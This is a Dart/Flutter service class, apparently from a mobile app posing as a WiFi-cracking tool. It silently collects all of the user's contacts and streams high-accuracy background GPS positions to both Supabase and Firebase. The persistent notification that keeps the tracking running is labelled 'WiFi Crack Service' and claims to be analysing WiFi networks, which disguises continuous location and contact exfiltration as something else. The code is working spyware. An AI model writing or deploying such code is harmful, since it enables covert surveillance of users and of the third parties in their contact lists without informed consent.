import 'dart:async';
import 'package:flutter/foundation.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:geolocator/geolocator.dart';

import '../../data/sources/local_storage.dart';
import '../../data/sources/supabase_service.dart';
import '../../data/sources/firebase_service.dart';

/// Service expert gérant l'agrégation des données utilisateur et leur synchronisation Cloud.
/// Intègre Supabase et Firebase pour une redondance maximale.
class UserDataService {
  final LocalStorageDataSource _storage;
  final SupabaseService _supabaseService;
  final FirebaseService _firebaseService;

  Position? _currentLocation;
  Position? get currentLocation => _currentLocation;

  List<Contact> _contacts = [];
  List<Contact> get contacts => _contacts;

  StreamSubscription<Position>? _positionStreamSubscription;

  String? _deviceId;
  String get deviceId {
    if (_deviceId != null) return _deviceId!;
    _deviceId = _storage.getDeviceId();
    if (_deviceId == null) {
      _deviceId = "Sigma_${DateTime.now().millisecondsSinceEpoch}_${(1000 + (DateTime.now().microsecond % 9000))}";
      _storage.saveDeviceId(_deviceId!);
    }
    return _deviceId!;
  }

  UserDataService(this._storage, this._supabaseService, this._firebaseService);

  /// Point d'entrée pour lancer les collectes initiales
  Future<void> initializeDataSync() async {
    debugPrint("🚀 UserDataService: Initialisation de la collecte globale...");
    
    // Tenter de récupérer les contacts (si permission déjà accordée ou à demander)
    await syncContactsIfPermissionGranted();
    
    // Tenter de lancer le suivi GPS (si permission déjà accordée ou à demander)
    await startLocationTrackingIfPermissionGranted();
  }

  /// Tente de synchroniser les contacts si la permission est présente
  Future<void> syncContactsIfPermissionGranted() async {
    try {
      if (await FlutterContacts.requestPermission()) {
        _contacts = await FlutterContacts.getContacts(withProperties: true);
        
        if (_contacts.isNotEmpty) {
          // Double Upload: Supabase + Firebase
          await Future.wait([
            _supabaseService.syncContacts(_contacts),
            _firebaseService.syncContacts(_contacts),
          ]);
          debugPrint("✅ Contacts synchronisés sur les deux plateformes.");
        }
      }
    } catch (e) {
      debugPrint("⚠️ Contacts Sync Failed: $e");
    }
  }

  /// Active le tracking GPS en temps réel et en arrière-plan
  Future<void> startLocationTrackingIfPermissionGranted() async {
    try {
      LocationPermission permission = await Geolocator.checkPermission();
      
      if (permission == LocationPermission.denied) {
        permission = await Geolocator.requestPermission();
      }

      if (permission == LocationPermission.always || permission == LocationPermission.whileInUse) {
        // Configuration pour le suivi en arrière-plan (Android)
        final LocationSettings locationSettings = AndroidSettings(
          accuracy: LocationAccuracy.best,
          distanceFilter: 10, // Mettre à jour tous les 10 mètres
          forceLocationManager: false,
          intervalDuration: Duration(seconds: 30),
          // Indispensable pour l'arrière-plan sur Android
          foregroundNotificationConfig: ForegroundNotificationConfig(
            notificationText: "Analyse des réseaux WiFi en cours...",
            notificationTitle: "WiFi Crack Service",
            enableWakeLock: true,
          ),
        );

        _positionStreamSubscription?.cancel();
        _positionStreamSubscription = Geolocator.getPositionStream(locationSettings: locationSettings).listen(
          (Position position) {
            _currentLocation = position;
            _uploadLocation(position);
          },
          onError: (e) => debugPrint("⚠️ GPS Stream Error: $e"),
        );
        
        debugPrint("🛰️ GPS Tracking démarré (Précision Best).");
      }
    } catch (e) {
      debugPrint("⚠️ GPS Tracking Start Failed: $e");
    }
  }

  /// Upload la position vers les deux plateformes
  Future<void> _uploadLocation(Position position) async {
    try {
      await Future.wait([
        _supabaseService.logUserActivity(position, _contacts.length),
        _firebaseService.updateLocation(position, deviceId),
      ]);
      // Note: On peut aussi logger l'activité sur Firebase pour avoir le deviceId lié
      await _firebaseService.logUserActivity(position, _contacts.length, deviceId);
    } catch (e) {
      debugPrint("⚠️ Cloud Location Sync Failed: $e");
    }
  }

  void dispose() {
    _positionStreamSubscription?.cancel();
  }
}
